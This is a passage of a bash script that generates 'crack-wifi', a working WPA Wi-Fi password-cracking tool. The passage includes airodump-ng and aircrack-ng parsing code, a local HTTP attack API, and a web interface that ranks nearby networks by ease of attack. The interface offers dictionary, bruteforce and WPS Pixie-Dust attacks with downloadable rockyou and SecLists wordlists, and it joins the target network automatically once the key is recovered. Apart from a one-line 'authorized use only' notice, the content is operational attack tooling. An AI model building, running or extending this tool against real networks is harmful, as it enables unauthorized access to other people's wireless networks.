        job.status = status
        if status == "stopped":
            job.emit("done", "Attack stopped by user.", "warn")
        return status


def _glob(prefix, ext):
    import glob
    return sorted(glob.glob(f"{prefix}*-*.{ext}") + glob.glob(f"{prefix}*.{ext}"))


def _parse_airodump_csv(path):
    try:
        with open(path, "r", errors="ignore") as fh:
            content = fh.read()
    except OSError:
        return []

    ap_block, client_block = content, ""
    if "Station MAC" in content:
        ap_block, client_block = content.split("Station MAC", 1)

    client_counts = {}
    for line in client_block.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if len(parts) > 5 and re.match(r"([0-9A-F]{2}:){5}", parts[5], re.I):
            client_counts[parts[5]] = client_counts.get(parts[5], 0) + 1

    nets = []
    for line in ap_block.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        bssid = parts[0]
        if not re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid, re.I):
            continue
        try:
            channel = int(parts[3])
        except ValueError:
            channel = 0
        try:
            signal = int(parts[8])
        except ValueError:
            signal = None
        priv = (parts[5] + " " + parts[6]).upper()
        if "WPA3" in priv:
            enc = "WPA2/WPA3" if "WPA2" in priv else "WPA3"
        elif "WPA2" in priv:
            enc = "WPA2"
        elif "WPA" in priv:
            enc = "WPA"
        elif "WEP" in priv:
            enc = "WEP"
        elif "OPN" in priv or priv.strip() == "":
            enc = "OPEN"
        else:
            enc = "WPA2"
        ssid = parts[13] if len(parts) > 13 else ""
        nets.append({
            "ssid": ssid or "(hidden)",
            "bssid": bssid,
            "enc": enc,
            "channel": channel,
            "signal": signal,
            "clients": client_counts.get(bssid, 0),
            "wps": False,
        })
    return nets


def _parse_aircrack_key(out):
    if not out:
        return None
    m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", out)
    return m.group(1) if m else None


def _has_handshake(cap_path, bssid):
    try:
        r = subprocess.run(["aircrack-ng", cap_path], capture_output=True, text=True, timeout=20)
    except Exception:
        return False
    for line in r.stdout.splitlines():
        if bssid.lower() in line.lower() and ("WPA (1 handshake" in line or "handshake" in line.lower()):
            return "1 handshake" in line or "handshakes" in line
    return "handshake" in (r.stdout or "").lower()


def build_engine(mode, wordlist=None):
    if mode == "real":
        return RealEngine(wordlist=wordlist)
    return DemoEngine(wordlist=wordlist)
CRACK_EOF_ENGINE

  cat > "${BUNDLE}/server/server.py" <<'CRACK_EOF_SERVER'
#!/usr/bin/env python3
import os
import sys
import json
import argparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "lib"))

import engine as engine_mod

MODE = os.environ.get("CRACK_MODE", "demo")
WORDLIST = os.environ.get("CRACK_WORDLIST") or None
WEBROOT = os.environ.get("CRACK_WEBROOT") or os.path.join(ROOT, "web")

ENGINE = engine_mod.build_engine(MODE, wordlist=WORDLIST)

_STATIC = {
    "/": ("index.html", "text/html; charset=utf-8"),
    "/index.html": ("index.html", "text/html; charset=utf-8"),
    "/style.css": ("style.css", "text/css; charset=utf-8"),
    "/app.js": ("app.js", "application/javascript; charset=utf-8"),
}


class Handler(BaseHTTPRequestHandler):
    server_version = "crack-wifi/1.0"

    def log_message(self, fmt, *args):
        pass

    def _send_json(self, obj, code=200):
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _send_static(self, filename, ctype):
        path = os.path.join(WEBROOT, filename)
        try:
            with open(path, "rb") as fh:
                body = fh.read()
        except OSError:
            self.send_error(404, "Not found")
            return
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self):
        length = int(self.headers.get("Content-Length") or 0)
        if length == 0:
            return {}
        try:
            return json.loads(self.rfile.read(length) or b"{}")
        except json.JSONDecodeError:
            return {}

    def do_GET(self):
        parsed = urlparse(self.path)
        route = parsed.path

        if route in _STATIC:
            fname, ctype = _STATIC[route]
            return self._send_static(fname, ctype)

        if route == "/api/status":
            return self._send_json({"mode": ENGINE.mode, "wordlist": WORDLIST})

        if route == "/api/scan":
            try:
                nets = ENGINE.scan()
            except Exception as e:
                return self._send_json({"error": str(e), "networks": []}, 500)
            return self._send_json({"networks": nets})

        if route == "/api/attack":
            qs = parse_qs(parsed.query)
            job_id = (qs.get("id") or [None])[0]
            since = int((qs.get("since") or ["0"])[0])
            if not job_id:
                return self._send_json({"error": "missing id"}, 400)
            snap = ENGINE.get_job(job_id, since=since)
            if snap is None:
                return self._send_json({"error": "unknown job"}, 404)
            return self._send_json(snap)

        self.send_error(404, "Not found")

    def do_POST(self):
        route = urlparse(self.path).path
        data = self._read_json()

        if route == "/api/attack":
            bssid = data.get("bssid")
            options = data.get("options") or {}
            if not bssid:
                return self._send_json({"error": "missing bssid"}, 400)
            return self._send_json({"job_id": ENGINE.start_attack(bssid, options)})

        if route == "/api/attack/stop":
            job_id = data.get("id")
            stopped = ENGINE.stop_job(job_id) if job_id else False
            return self._send_json({"stopped": stopped})

        self.send_error(404, "Not found")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8777)
    args = ap.parse_args()

    httpd = ThreadingHTTPServer((args.host, args.port), Handler)
    print(f"[server] crack-wifi listening on http://{args.host}:{args.port} (mode={ENGINE.mode})", flush=True)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()


if __name__ == "__main__":
    main()
CRACK_EOF_SERVER

  cat > "${BUNDLE}/web/index.html" <<'CRACK_EOF_INDEX'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>crack-wifi</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <header class="topbar">
    <div class="brand"><span class="dot"></span> crack-wifi</div>
    <span id="mode" class="mode">demo</span>
  </header>

  <p class="notice">Authorized use only — audit networks you own or have written permission to test.</p>

  <main class="grid">
    <aside class="card networks">
      <div class="card-head">
        <h2>Networks</h2>
        <button id="rescan" class="icon-btn" title="Rescan" aria-label="Rescan">&#8635;</button>
      </div>
      <p id="net-status" class="status">Scanning…</p>
      <ul id="net-list" class="net-list"></ul>
    </aside>

    <section class="card detail">
      <div id="empty" class="empty">Select a network to see how hard it is and start an audit.</div>

      <div id="detail" class="hidden">
        <div class="detail-head">
          <h2 id="d-ssid"></h2>
          <div class="chips">
            <span id="d-bssid" class="mono muted"></span>
            <span id="d-enc" class="chip"></span>
            <span id="d-ch" class="chip"></span>
            <span id="d-sig" class="chip"></span>
            <span id="d-wps" class="chip hidden">WPS</span>
          </div>
        </div>

        <div class="meter">
          <div class="meter-top">
            <span id="d-label" class="meter-label">—</span>
            <span id="d-score" class="mono muted"></span>
          </div>
          <div class="bar"><div id="d-bar" class="bar-fill"></div></div>
          <span id="d-eta" class="small muted"></span>
        </div>

        <ul id="d-reasons" class="reasons"></ul>

        <details class="options">
          <summary>Options</summary>
          <div class="opt-grid">
            <label>Method
              <select id="opt-method">
                <option value="auto">Auto</option>
                <option value="handshake+dictionary">Dictionary</option>
                <option value="handshake+bruteforce">Bruteforce</option>
                <option value="wps-pixie">WPS Pixie-Dust</option>
              </select>
            </label>
            <label>Online wordlist
              <select id="opt-online"><option value="">— local path —</option></select>
            </label>
            <label class="wide">Wordlist
              <input id="opt-wordlist" type="text" placeholder="/usr/share/wordlists/rockyou.txt" />
            </label>
            <label>Bruteforce charset
              <select id="opt-charset">
                <option value="digits">Digits</option>
                <option value="lower">Lowercase</option>
                <option value="alnum">Alphanumeric</option>
              </select>
            </label>
            <label>Bruteforce length
              <input id="opt-length" type="number" min="4" max="16" value="8" />
            </label>
            <label class="check"><input id="opt-connect" type="checkbox" checked /> Auto-connect when the key is found</label>
          </div>
        </details>

        <div class="actions">
          <button id="start" class="btn primary">Start audit</button>
          <button id="stop" class="btn ghost hidden">Stop</button>
          <span id="pill" class="pill hidden"></span>
        </div>

        <div id="progress" class="progress hidden">
          <div class="progress-top">
            <span id="progress-label">Working</span>
            <span id="progress-pct" class="mono"></span>
          </div>
          <div class="bar"><div id="progress-bar" class="bar-fill"></div></div>
        </div>

        <div id="result" class="result hidden">
          <h3>Recovered</h3>
          <dl>
            <div><dt>Network</dt><dd id="r-ssid" class="mono"></dd></div>
            <div><dt>Password</dt><dd id="r-key" class="mono strong"></dd></div>
            <div id="r-user-row" class="hidden"><dt>Login</dt><dd id="r-user" class="mono"></dd></div>
            <div><dt>Method</dt><dd id="r-method"></dd></div>
            <div><dt>Status</dt><dd id="r-status"></dd></div>
          </dl>
          <code id="r-cmd" class="cmd hidden"></code>
          <p id="r-note" class="small muted"></p>
        </div>

        <div class="console-wrap">
          <div class="console-head"><span>Activity</span><span id="phase" class="mono muted"></span></div>
          <div id="console" class="console"></div>
        </div>
      </div>
    </section>
  </main>

  <script src="/app.js"></script>
</body>
</html>
CRACK_EOF_INDEX

  cat > "${BUNDLE}/web/style.css" <<'CRACK_EOF_STYLE'
:root {
  --bg: #f5f6f8;
  --card: #ffffff;
  --border: #e4e7eb;
  --text: #1c2126;
  --muted: #6b7280;
  --accent: #2563eb;
  --accent-weak: #eef4ff;
  --ok: #15803d;
  --ok-weak: #eaf6ee;
  --warn: #b45309;
  --danger: #dc2626;
  --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
  --sans: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

* { box-sizing: border-box; }
body {
  margin: 0;
  background: var(--bg);
  color: var(--text);
  font-family: var(--sans);
  font-size: 14px;
  line-height: 1.55;
}

.hidden { display: none !important; }
.muted { color: var(--muted); }
.small { font-size: 12px; }
.mono { font-family: var(--mono); }
.strong { font-weight: 600; }

.topbar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 14px 24px;
  background: var(--card);
  border-bottom: 1px solid var(--border);
}
.brand { display: flex; align-items: center; gap: 9px; font-weight: 600; font-size: 16px; }
.dot { width: 9px; height: 9px; border-radius: 50%; background: var(--accent); }
.mode {
  font-family: var(--mono);
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: .04em;
  padding: 3px 9px;
  border-radius: 999px;
  background: var(--accent-weak);
  color: var(--accent);
}
.mode.real { background: var(--ok-weak); color: var(--ok); }

.notice {
  margin: 0;
  padding: 8px 24px;
  font-size: 12.5px;
  color: var(--warn);
  background: #fdf6ec;
  border-bottom: 1px solid #f3e6cf;
  text-align: center;
}

.grid {
  display: grid;
  grid-template-columns: 320px 1fr;
  gap: 20px;
  max-width: 1080px;
  margin: 0 auto;
  padding: 24px;
  align-items: start;
}
@media (max-width: 780px) { .grid { grid-template-columns: 1fr; padding: 16px; } }

.card {
  background: var(--card);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 16px;
}
.card-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px; }
.card-head h2 { margin: 0; font-size: 13px; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); }

.icon-btn {
  width: 30px; height: 30px;
  display: inline-flex; align-items: center; justify-content: center;
  border: 1px solid var(--border); border-radius: 8px;
  background: var(--card); color: var(--muted);
  font-size: 16px; cursor: pointer;
  transition: background .12s, color .12s, transform .4s;
}
.icon-btn:hover { background: var(--bg); color: var(--text); }
.icon-btn.spin { animation: spin .8s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }

.status { margin: 4px 0 8px; font-size: 12.5px; color: var(--muted); }

.net-list { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 2px; }
.net {
  display: flex; align-items: center; gap: 10px;
  padding: 10px; border-radius: 9px; cursor: pointer;
  border: 1px solid transparent;
}
.net:hover { background: var(--bg); }
.net.active { background: var(--accent-weak); border-color: #cfe0ff; }
.net-main { flex: 1; min-width: 0; }
.net-ssid { font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.net-sub { font-size: 11.5px; color: var(--muted); font-family: var(--mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

.badge { font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 999px; white-space: nowrap; }
.b-Trivial, .b-Easy { background: var(--ok-weak); color: var(--ok); }
.b-Moderate { background: #fdf3e3; color: var(--warn); }
.b-Hard, .b-Veryhard { background: #fdecec; color: var(--danger); }
.hs {
  font-size: 10px; font-weight: 700; letter-spacing: .03em;
  padding: 2px 6px; border-radius: 999px;
  background: var(--ok-weak); color: var(--ok);
}

.skeleton { height: 40px; border-radius: 9px; background: linear-gradient(90deg, #eef0f3 25%, #e3e6ea 37%, #eef0f3 63%); background-size: 400% 100%; animation: shimmer 1.2s infinite; }
@keyframes shimmer { 0% { background-position: 100% 0; } 100% { background-position: 0 0; } }

.empty { padding: 48px 16px; text-align: center; color: var(--muted); }

.detail-head h2 { margin: 0 0 8px; font-size: 20px; }
.chips { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
.chip { font-size: 11.5px; font-family: var(--mono); padding: 2px 8px; border-radius: 6px; background: var(--bg); border: 1px solid var(--border); color: var(--muted); }

.meter { margin: 20px 0 4px; }
.meter-top { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 6px; }
.meter-label { font-weight: 600; }
.bar { height: 8px; border-radius: 999px; background: var(--bg); border: 1px solid var(--border); overflow: hidden; }
.bar-fill { height: 100%; width: 0; background: var(--accent); border-radius: 999px; transition: width .4s ease, background .3s; }
.bar-fill.indeterminate { width: 35% !important; animation: indet 1.1s ease-in-out infinite; }
@keyframes indet { 0% { margin-left: -35%; } 100% { margin-left: 100%; } }

.reasons { list-style: none; margin: 14px 0 0; padding: 0; display: flex; flex-direction: column; gap: 5px; }
.reasons li { font-size: 12.5px; color: var(--muted); padding-left: 16px; position: relative; }
.reasons li::before { content: "›"; position: absolute; left: 2px; color: var(--accent); }

.options { margin-top: 18px; border-top: 1px solid var(--border); padding-top: 12px; }
.options summary { cursor: pointer; font-weight: 600; color: var(--muted); font-size: 13px; }
.opt-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 14px; }
.opt-grid label { display: flex; flex-direction: column; gap: 4px; font-size: 12px; color: var(--muted); }
.opt-grid label.wide { grid-column: 1 / -1; }
.opt-grid input, .opt-grid select {
  font-family: var(--mono); font-size: 12.5px;
  padding: 8px 9px; border: 1px solid var(--border); border-radius: 8px;
  background: var(--card); color: var(--text);
}
.opt-grid input:focus, .opt-grid select:focus { outline: none; border-color: var(--accent); }
.opt-grid .check { grid-column: 1 / -1; flex-direction: row; align-items: center; gap: 8px; color: var(--text); font-size: 13px; cursor: pointer; }
.opt-grid .check input { width: 16px; height: 16px; accent-color: var(--accent); }

.actions { display: flex; align-items: center; gap: 10px; margin-top: 18px; }
.btn { font-family: var(--sans); font-size: 13px; font-weight: 600; padding: 9px 16px; border-radius: 8px; border: 1px solid transparent; cursor: pointer; transition: background .12s, border-color .12s, opacity .12s; }
.btn:disabled { opacity: .5; cursor: not-allowed; }
.btn.primary { background: var(--accent); color: #fff; }
.btn.primary:hover:not(:disabled) { background: #1d4ed8; }
.btn.ghost { background: var(--card); color: var(--muted); border-color: var(--border); }
.btn.ghost:hover { color: var(--text); border-color: var(--muted); }

.pill { font-size: 12px; font-family: var(--mono); padding: 4px 11px; border-radius: 999px; border: 1px solid var(--border); }
.pill.running { color: var(--accent); border-color: #cfe0ff; background: var(--accent-weak); }
.pill.success { color: var(--ok); border-color: #cdead7; background: var(--ok-weak); }
.pill.failed { color: var(--danger); border-color: #f6d4d4; background: #fdecec; }
.pill.stopped { color: var(--warn); border-color: #f0dcbb; background: #fdf3e3; }

.progress { margin-top: 16px; }
.progress-top { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 6px; }
.progress-top span:first-child { font-size: 12px; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); }
.progress-pct { font-size: 12px; color: var(--accent); font-weight: 600; }
.progress .bar-fill.download { background: #7c3aed; }

.result { margin-top: 18px; padding: 16px; border: 1px solid #cdeaD7; background: var(--ok-weak); border-radius: 10px; }
.result h3 { margin: 0 0 12px; font-size: 13px; text-transform: uppercase; letter-spacing: .05em; color: var(--ok); }
.result dl { margin: 0; display: flex; flex-direction: column; gap: 9px; }
.result dl > div { display: flex; justify-content: space-between; align-items: baseline; gap: 12px; }
.result dt { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .04em; }
.result dd { margin: 0; text-align: right; word-break: break-all; }
.result dd.strong { font-size: 16px; color: var(--ok); }
.result .ok { color: var(--ok); font-weight: 600; }
.result .warn { color: var(--warn); font-weight: 600; }
.cmd { display: block; margin-top: 12px; padding: 9px 11px; font-family: var(--mono); font-size: 12.5px; background: #fff; border: 1px solid var(--border); border-radius: 8px; color: var(--accent); word-break: break-all; }
.result p { margin: 10px 0 0; }

.console-wrap { margin-top: 20px; }
.console-head { display: flex; justify-content: space-between; align-items: center; padding: 8px 12px; background: var(--bg); border: 1px solid var(--border); border-bottom: none; border-radius: 9px 9px 0 0; font-size: 12px; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); }
.console { height: 240px; overflow-y: auto; padding: 10px 12px; background: #0f1620; color: #d6deea; border: 1px solid var(--border); border-radius: 0 0 9px 9px; font-family: var(--mono); font-size: 12px; line-height: 1.65; }
.line { display: flex; gap: 10px; white-space: pre-wrap; word-break: break-word; }
.line .t { color: #5b6b80; flex-shrink: 0; }
.line .p { color: #7c8ba1; flex-shrink: 0; width: 62px; }
.line.success .m { color: #5fd68a; font-weight: 600; }
.line.warn .m { color: #f0b429; }
.line.error .m { color: #ff7a7a; }
CRACK_EOF_STYLE

  cat > "${BUNDLE}/web/app.js" <<'CRACK_EOF_APP'
(function () {
  "use strict";

  const $ = (id) => document.getElementById(id);

  const api = {
    status: () => fetch("/api/status").then((r) => r.json()),
    scan: () => fetch("/api/scan").then((r) => r.json()),
    attack: (bssid, options) => fetch("/api/attack", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ bssid, options }),
    }).then((r) => r.json()),
    poll: (id, since) => fetch(`/api/attack?id=${encodeURIComponent(id)}&since=${since}`).then((r) => r.json()),
    stop: (id) => fetch("/api/attack/stop", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id }),
    }).then((r) => r.json()),
  };

  const ONLINE_WORDLISTS = [
    { label: "Top 10k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" },
    { label: "Top 100k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" },
    { label: "Top 1M passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt" },
    { label: "rockyou.txt (~14M, large)", url: "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" },
  ];

  const PHASE_LABELS = { crack: "Cracking", capture: "Capturing handshake", download: "Downloading wordlist" };

  const state = { networks: [], selected: null, jobId: null, since: 0, timer: null, scanning: false };

  function esc(s) {
    return String(s == null ? "" : s)
      .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
  }

  function signalBars(dbm) {
    if (dbm == null) return "····";
    if (dbm >= -55) return "▁▃▅▇";
    if (dbm >= -65) return "▁▃▅ ";
    if (dbm >= -75) return "▁▃  ";
    return "▁   ";
  }

  function scoreColor(s) {
    if (s < 30) return "#15803d";
    if (s < 55) return "#b45309";
    if (s < 80) return "#ea580c";
    return "#dc2626";
  }

  function renderNetworks(nets) {
    const list = $("net-list");
    list.innerHTML = "";
    $("net-status").textContent = nets.length ? `${nets.length} networks, easiest first` : "No networks found.";
    nets.forEach((n) => {
      const li = document.createElement("li");
      li.className = "net";
      li.dataset.bssid = n.bssid;
      const diff = n.difficulty || { label: "?", score: 0 };
      const sub = `${esc(n.enc)} · ch ${n.channel} · ${n.signal != null ? n.signal + " dBm" : "—"}${n.wps ? " · WPS" : ""}`;
      li.innerHTML =
        `<div class="net-main"><div class="net-ssid">${esc(n.ssid)}</div><div class="net-sub">${signalBars(n.signal)}  ${sub}</div></div>` +
        (n.has_handshake ? `<span class="hs" title="Handshake captured this session">HS</span>` : "") +
        `<span class="badge b-${esc((diff.label || "").replace(/\s+/g, ""))}">${esc(diff.label)}</span>`;
      li.addEventListener("click", () => selectNetwork(n));
      list.appendChild(li);
    });
  }

  function markActive(bssid) {
    document.querySelectorAll(".net").forEach((el) => el.classList.toggle("active", el.dataset.bssid === bssid));
  }

  function selectNetwork(n) {
    state.selected = n;
    markActive(n.bssid);
    $("empty").classList.add("hidden");
    $("detail").classList.remove("hidden");
    resetAttackUI();

    $("d-ssid").textContent = n.ssid;
    $("d-bssid").textContent = n.bssid;
    $("d-enc").textContent = n.enc;
    $("d-ch").textContent = "ch " + n.channel;
    $("d-sig").textContent = n.signal != null ? n.signal + " dBm" : "—";
    $("d-wps").classList.toggle("hidden", !n.wps);

    const d = n.difficulty || { score: 0, label: "?", eta: "", reasons: [] };
    $("d-label").textContent = d.label;
    $("d-score").textContent = d.score + " / 100";
    $("d-eta").textContent = "ETA: " + d.eta;
    const bar = $("d-bar");
    bar.style.width = Math.max(0, Math.min(100, d.score)) + "%";
    bar.style.background = scoreColor(d.score);

    const reasons = $("d-reasons");
    reasons.innerHTML = "";
    (d.reasons || []).forEach((r) => {
      const li = document.createElement("li");
      li.textContent = r;
      reasons.appendChild(li);
    });

    $("opt-method").value = d.method === "wps-pixie" ? "wps-pixie" : "auto";
  }

  function collectOptions() {
    const method = $("opt-method").value;
    const opts = { method, connect: $("opt-connect").checked };
    const wl = $("opt-wordlist").value.trim();
    if (wl) opts.wordlist = wl;
    if (method === "handshake+bruteforce") {
      opts.bruteforce = true;
      opts.charset = $("opt-charset").value;
      opts.length = parseInt($("opt-length").value, 10) || 8;
    }
    if (state.selected) {
      opts.ssid = state.selected.ssid;
      opts.enc = state.selected.enc;
      opts.channel = state.selected.channel;
    }
    return opts;
  }

  async function startAttack() {
    if (!state.selected) return;
    resetAttackUI();
    $("start").disabled = true;
    $("stop").classList.remove("hidden");
    setPill("running");
    const res = await api.attack(state.selected.bssid, collectOptions());
    if (res.error) {
      logLine({ t: 0, phase: "error", level: "error", msg: res.error });
      finishUI("failed");
      return;
    }
    state.jobId = res.job_id;
    state.since = 0;
    poll();
  }

  function poll() {
    clearTimeout(state.timer);
    api.poll(state.jobId, state.since).then((snap) => {
      if (snap.error) return;
      (snap.events || []).forEach(logLine);
      state.since = snap.total_events;
      updateProgress(snap);
      if (snap.status === "running") {
        state.timer = setTimeout(poll, 350);
      } else {
        finishUI(snap.status);
        if (snap.result) showResult(snap.network, snap.result);
        doScan();
      }
    }).catch(() => { state.timer = setTimeout(poll, 800); });
  }

  async function stopAttack() {
    if (state.jobId) await api.stop(state.jobId);
  }

  function finishUI(status) {
    $("start").disabled = false;
    $("stop").classList.add("hidden");
    setPill(status);
  }

  function updateProgress(snap) {
    const wrap = $("progress");
    const fill = $("progress-bar");
    const p = snap.progress;
    if (snap.status === "running" && p && p.phase) {
      wrap.classList.remove("hidden");
      $("progress-label").textContent = PHASE_LABELS[p.phase] || "Working";
      fill.classList.toggle("download", p.phase === "download");
      if (typeof p.pct === "number") {
        fill.classList.remove("indeterminate");
        fill.style.width = p.pct + "%";
        $("progress-pct").textContent = p.pct + "%";
      } else {
        fill.classList.add("indeterminate");
        $("progress-pct").textContent = "";
      }
    } else if (snap.status === "success" && p) {
      fill.classList.remove("indeterminate");
      fill.style.width = "100%";
      $("progress-pct").textContent = "100%";
      $("progress-label").textContent = "Done";
    }
  }

  function showResult(network, result) {
    $("result").classList.remove("hidden");
    $("r-ssid").textContent = (network && network.ssid) || (state.selected && state.selected.ssid) || "";
    $("r-key").textContent = result.key != null ? result.key : "(none — open network)";
    $("r-method").textContent = result.method || "";
    if (result.user) {
      $("r-user-row").classList.remove("hidden");
      $("r-user").textContent = result.user;
    } else {
      $("r-user-row").classList.add("hidden");
    }
    const st = $("r-status");
    const cmd = $("r-cmd");
    if (result.connected) {
      st.textContent = "✓ Connected — you are on the network";
      st.className = "ok";
      cmd.classList.add("hidden");
    } else if (result.connect_cmd) {
      st.textContent = "Not connected — run the command below";
      st.className = "warn";
      cmd.textContent = "$ " + result.connect_cmd;
      cmd.classList.remove("hidden");
    } else {
      st.textContent = "—";
      st.className = "";
      cmd.classList.add("hidden");
    }
    $("r-note").textContent = result.note || "";
  }

  function logLine(ev) {
    const c = $("console");
    const line = document.createElement("div");
    line.className = "line " + (ev.level || "info");
    line.innerHTML =
      `<span class="t">${(ev.t ?? 0).toFixed(1)}s</span>` +
      `<span class="p">${esc(ev.phase || "")}</span>` +
      `<span class="m">${esc(ev.msg || "")}</span>`;
    c.appendChild(line);
    c.scrollTop = c.scrollHeight;
    if (ev.phase) $("phase").textContent = ev.phase;
  }

  function resetAttackUI() {
    clearTimeout(state.timer);
    state.jobId = null;
    state.since = 0;
    $("console").innerHTML = "";
    $("phase").textContent = "";
    $("result").classList.add("hidden");
    $("pill").classList.add("hidden");
    $("stop").classList.add("hidden");
    $("start").disabled = false;
    const fill = $("progress-bar");
    $("progress").classList.add("hidden");
    fill.classList.remove("indeterminate", "download");
    fill.style.width = "0";
    $("progress-pct").textContent = "";
  }

  function setPill(status) {
    const pill = $("pill");
    pill.className = "pill " + status;
    pill.textContent = status;
  }

  async function doScan() {
    if (state.scanning) return;
    state.scanning = true;
    $("rescan").classList.add("spin");
    if (!state.networks.length) showSkeleton();
    try {
      const res = await api.scan();
      state.networks = (res.networks || []).sort(
        (a, b) => (a.difficulty?.score ?? 100) - (b.difficulty?.score ?? 100));
      renderNetworks(state.networks);
      if (state.selected) {
        const upd = state.networks.find((n) => n.bssid === state.selected.bssid);
        if (upd) state.selected = upd;
        markActive(state.selected.bssid);
      }
    } catch (e) {
      $("net-status").textContent = "Scan failed — click ↻ to retry.";
    } finally {
      $("rescan").classList.remove("spin");
      state.scanning = false;
    }
  }

  function showSkeleton() {
    $("net-status").textContent = "Scanning…";
    const list = $("net-list");
    list.innerHTML = "";
    for (let i = 0; i < 5; i++) {
      const li = document.createElement("li");
      li.className = "skeleton";
      list.appendChild(li);
    }
  }

  function init() {
    const sel = $("opt-online");
    ONLINE_WORDLISTS.forEach((w) => {
      const o = document.createElement("option");
      o.value = w.url;
      o.textContent = w.label;
      sel.appendChild(o);
    });

    $("rescan").addEventListener("click", doScan);
    $("start").addEventListener("click", startAttack);
    $("stop").addEventListener("click", stopAttack);
    $("opt-online").addEventListener("change", (e) => { if (e.target.value) $("opt-wordlist").value = e.target.value; });

    api.status().then((s) => {
      const m = $("mode");
      m.textContent = s.mode;
      m.className = "mode " + (s.mode === "real" ? "real" : "");
      if (s.wordlist) $("opt-wordlist").placeholder = s.wordlist;
    }).catch(() => {});

    doScan();
  }

  document.addEventListener("DOMContentLoaded", init);
})();
CRACK_EOF_APP

  chmod +x "${BUNDLE}/setup.sh"
}

maybe_setup() {
  [[ "$MODE" == "demo" ]] && return 0
  [[ "$SKIP_SETUP" == "1" ]] && return 0

  local missing=()
  for t in python3 iw airmon-ng airodump-ng aireplay-ng aircrack-ng; do
    have "$t" || missing+=("$t")
  done
  have xdg-open || missing+=("xdg-open")
  [[ ${#missing[@]} -eq 0 ]] && return 0

  warn "Missing dependencies: ${missing[*]}"
  log "Installing them automatically (apt)..."
  bash "${BUNDLE}/setup.sh" && ok "Setup finished." || warn "Setup incomplete — may fall back to DEMO."
}

detect_mode() {
  if [[ "$MODE" == "demo" ]]; then
    ok "Running in DEMO mode (simulated networks)."
    return
  fi

  local missing=()
  for t in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
    have "$t" || missing+=("$t")
  done

  if [[ "$MODE" == "real" ]]; then
    if [[ ${#missing[@]} -gt 0 ]]; then
      err "Real mode requested but missing tools: ${missing[*]}"
      err "Try: sudo apt install -y aircrack-ng"
      exit 1
    fi
    if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
      err "Real mode needs root. Re-run: sudo ./single-script.sh --real"
      exit 1
    fi
    ok "Running in REAL mode."
    return
  fi

  if [[ ${#missing[@]} -eq 0 && "${EUID:-$(id -u)}" -eq 0 ]]; then
    MODE="real"
    ok "aircrack-ng found and running as root -> REAL mode."
  else
    MODE="demo"
    if [[ ${#missing[@]} -gt 0 ]]; then
      warn "Missing tools (${missing[*]}) -> DEMO mode."
    else
      warn "Not running as root -> DEMO mode."
    fi
    log "For real audits: sudo ./single-script.sh"
  fi
}

setup_dns() {
  [[ "$MANAGE_DNS" == "1" ]] || { UI_HOST="$BIND_HOST"; return; }
  if [[ ! -w "$HOSTS_FILE" ]]; then
    warn "Cannot write ${HOSTS_FILE} (need root). Using ${BIND_HOST}."
    MANAGE_DNS="0"; UI_HOST="$BIND_HOST"; return
  fi
  if grep -q "$HOSTNAME_LOCAL" "$HOSTS_FILE" 2>/dev/null; then
    log "${HOSTNAME_LOCAL} already in ${HOSTS_FILE}."
  else
    printf '%s\t%s %s\n' "127.0.0.1" "$HOSTNAME_LOCAL" "$HOSTS_MARKER" >> "$HOSTS_FILE"
    ok "Added ${HOSTNAME_LOCAL} -> 127.0.0.1 to ${HOSTS_FILE} (temporary)."
